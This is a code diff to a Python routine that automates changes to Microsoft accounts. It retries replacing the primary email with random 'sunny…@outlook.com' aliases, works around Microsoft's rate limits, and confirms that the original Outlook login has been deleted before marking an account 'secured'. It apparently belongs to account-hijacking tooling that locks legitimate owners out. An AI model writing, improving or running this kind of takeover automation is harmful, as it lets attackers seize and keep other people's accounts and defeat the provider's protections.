@@ -560,13 +560,24 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                 changed = False
                 last_local = ""
                 max_alias_attempts = 3
+                # If a prior attempt already added a sunny* alias but MakePrimary
+                # flaked, promote that one instead of burning a new AddAssocId
+                # (MS rate-limits → "try again later").
+                pending_sunny_local: str | None = None
                 for attempt in range(1, max_alias_attempts + 1):
-                    primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
+                    if pending_sunny_local:
+                        primaryEmail = pending_sunny_local
+                        print(
+                            f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
+                            f"(re-promote {primaryEmail}@outlook.com)"
+                        )
+                    else:
+                        primaryEmail = f"sunny{uuid.uuid4().hex[:12]}"
+                        print(
+                            f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
+                            f"({primaryEmail}@outlook.com)"
+                        )
                     last_local = primaryEmail
-                    print(
-                        f"[~] - Primary alias attempt {attempt}/{max_alias_attempts} "
-                        f"({primaryEmail}@outlook.com)"
-                    )
                     # Refresh canary between retries — stale after MFA / failed AddAssocId
                     try:
                         fresh = await get_cookies(session)
@@ -586,8 +597,72 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                         account_info["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                         account_info["microsoft"]["primary_alias_replaced"] = True
                         break
+                    # Detect sunny we already parked on the account
+                    try:
+                        from securing.utils.security.change_primary_alias import (
+                            _get_manage,
+                        )
+
+                        _, _, aliases_now = await _get_manage(session)
+                        parked = [
+                            a.split("@", 1)[0]
+                            for a in aliases_now
+                            if a.lower().startswith("sunny")
+                            and a.lower().endswith("@outlook.com")
+                        ]
+                        if parked:
+                            pending_sunny_local = parked[0]
+                            print(
+                                f"[~] - Sunny alias already on account "
+                                f"({pending_sunny_local}@outlook.com) — "
+                                "will re-promote next attempt"
+                            )
+                        else:
+                            pending_sunny_local = None
+                    except Exception:
+                        pending_sunny_local = None
                     if attempt < max_alias_attempts:
                         await asyncio.sleep(2.0 * attempt)
+
+                if not changed:
+                    # MakePrimary JSON often lies while removeOldPrimary already
+                    # deleted the old Outlook login. Confirm via GetCredentialType
+                    # before marking replace failed (avoids returning a secured
+                    # sunny* account as "primary unchanged").
+                    try:
+                        from securing.utils.security.change_primary_alias import (
+                            _confirm_primary_switched,
+                        )
+
+                        candidates: list[str] = []
+                        if pending_sunny_local:
+                            candidates.append(pending_sunny_local)
+                        if last_local and last_local not in candidates:
+                            candidates.append(last_local)
+                        old_login = (
+                            ms.get("original_email")
+                            or ms.get("email")
+                            or main_email
+                        )
+                        for loc in candidates:
+                            full_try = f"{loc}@outlook.com"
+                            if await _confirm_primary_switched(
+                                session, full_try, old_login
+                            ):
+                                changed = True
+                                account_info["microsoft"]["email"] = full_try
+                                account_info["microsoft"][
+                                    "primary_alias_replaced"
+                                ] = True
+                                print(
+                                    f"[+] - Primary replace recovered via "
+                                    f"post-check ({full_try})"
+                                )
+                                break
+                    except Exception as exc:
+                        log.warning(
+                            "primary replace post-check failed: %s", exc
+                        )
 
                 if not changed:
                     kept = account_info["microsoft"]["email"]
